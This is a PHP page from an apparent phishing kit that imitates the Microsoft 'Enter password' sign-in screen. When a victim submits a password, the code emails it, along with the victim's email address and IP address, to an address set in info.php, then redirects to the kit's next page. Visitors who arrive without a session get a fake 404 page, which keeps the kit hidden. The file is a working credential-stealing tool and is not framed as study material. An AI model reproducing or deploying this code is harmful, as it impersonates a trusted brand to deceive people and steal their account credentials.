<?php session_start();
require_once 'info.php';
$ip = $_SERVER['REMOTE_ADDR'];

if(empty($_SESSION['email']))
{
    header('HTTP/1.1 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

if(isset($_POST['submit']))
{
    $password = $_POST['passwd'];

    if(trim($password) == "" || strlen($password) < 4)
    {
        $error = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
    }

    else {

        $_SESSION['passwd'] = $password;

        $subject =  'inf ';
        $to      =  EMAIL;
        $msg     =  $_SESSION['email'].'<br>';
        $msg    .=  $password.'<br>';
        $msg    .=  $ip;

        $headers    =  'MIME-Version:1.0' . "\r\n";
        $headers   .=  'Content-type: text/html; charset=utf-8' . "\r\n";
        $headers   .=  'From: 36h' . "\r\n";
                        'X-Mailer: PHP/' . phpversion();
        mail($to, $subject, $msg, $headers);

        header("Location:next.php");
        exit;
    }

}

?>

<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="LocLC" content="en-US" />
    <link rel="shortcut icon" href="images/favicon.ico" />
    
    <link href="css/c.login.min.css" rel="stylesheet" />

    <script crossorigin="anonymous" src="css/c_pcore.min.js" /></script>

    <script crossorigin="anonymous" src="css/c-en.min.js" /></script>

</head>

<body class="cb" style="display: block;">


<div>
<div>
	<div class="background" role="presentation">
		
<div style="background-image: url(&quot;images/0-small.jpg&quot;);"></div>
<div class="backgroundImage" style="background-image: url(&quot;images/1.jpeg&quot;);"></div>
<div class="background-overlay"></div></div></div> 

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="">
	
	<div class="outer">
        <div class="middle">
            <div class="inner">
                <div><img class="logo" role="presentation" pngsrc="images/logo.png" svgsrc="images/logo.svg" src="images/logo.svg">
                </div><div><div>
                                <div><!--  --> 

                            <div class="identityBanner"> <div id="displayName" class="identity"><?php echo $_SESSION['email']; ?></div> 
                            <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="images/profile.svg"> </div> </div></div> 

                            <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>

                            <div class="row"> <div class="form-group col-md-24"> 
                             <?php if(isset($_POST['submit'])){?>   
                            	<div role="alert" aria-live="assertive" aria-atomic="false"> 
                            		<div id="passwordError" class="alert alert-error"><?php echo $error; ?>
                            	    </div> 
                                </div> 
                             <?php } ?>
                            <div class="placeholderContainer">
                            <input name="passwd" type="password" maxlength="40" id="passwd" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password"> </div> </div> </div><div class="row"> <div><div class="col-xs-24 form-group no-padding-left-right"> <div class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block"  value="Back"> </div> <div class="col-xs-12 primary"> <input name="submit" type="submit" id="idSIButton9" class="btn btn-block btn-primary"  value="Sign in"> </div> </div></div> </div>



            <div class="row"> 
				<div class="col-md-24">
					
            <div class="text-13 form-group no-margin-bottom"> <a id="cantAccessAccount" href="#">Forgot my password</a> </div></div> </div></div>
            </div>
            </div>
            </div>
            
            </div>
        </div>
            
					
					<div id="footer" class="footer default"> <div>
 
 
 <div id="footerLinks" class="footerNode text-secondary"> 
    <span id="ftrCopy">©<?php echo @date("Y"); ?> Microsoft</span>
    <a id="ftrTerms" href="#">Terms of use</a> 
    <a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
</div> 

</div>
</div>

</form> 
                
</div>
</body>
</html>
